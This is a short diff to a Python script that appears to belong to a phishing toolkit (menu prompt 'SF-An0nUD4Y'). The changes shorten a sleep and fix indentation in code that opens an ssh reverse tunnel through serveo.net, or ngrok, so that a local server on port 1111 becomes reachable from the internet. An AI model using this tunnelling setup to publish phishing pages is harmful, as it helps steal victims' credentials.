@@ -285,7 +285,7 @@ def runPEnv():
     
 def serveo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
-    sleep(10)
+    sleep(7)
     f = open('sendlink.txt', 'r')
     a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
     lst = []
@@ -329,11 +329,11 @@ if __name__ == "__main__":
                 print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, END))
                 choice = input(" \n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
                 if choice == '1':
-                	runNgrok()
+                    runNgrok()
                 elif choice == '2':
                     serveo()
                 else:
-                	system('clear')
+                    system('clear')
                     return server()
         server()
         multiprocessing.Process(target=runServer).start()
